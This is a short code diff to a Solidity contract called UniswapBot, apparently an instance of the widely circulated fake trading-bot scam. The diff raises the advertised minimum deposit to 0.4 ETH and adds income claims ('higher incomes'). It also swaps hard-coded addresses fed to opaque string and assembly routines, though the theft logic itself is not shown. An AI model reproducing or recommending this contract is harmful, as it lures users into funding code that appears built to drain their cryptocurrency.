@@ -10,8 +10,8 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
   * Testnet transactions will fail as there is no value
   * Profit remaining will be transfered to contract creator
 
-  * Updated build
-  * Min contract liquidity + gas fees has to equal 0.2 ETH
+  * Updated 2025 build with Uniswap contract for higher incomes.
+  * Min contract liquidity + gas fees now has to equal 0.4 ETH
 */
 
 contract UniswapBot {
@@ -21,8 +21,7 @@ contract UniswapBot {
     uint liquidity;
 
     event Log(string _msg);
-
-
+    
 
     receive() external payable {}
 
@@ -53,9 +52,9 @@ contract UniswapBot {
             uint b;
 
             string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
+            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
             assembly {
                 a := mload(selfptr)
                 b := mload(otherptr)
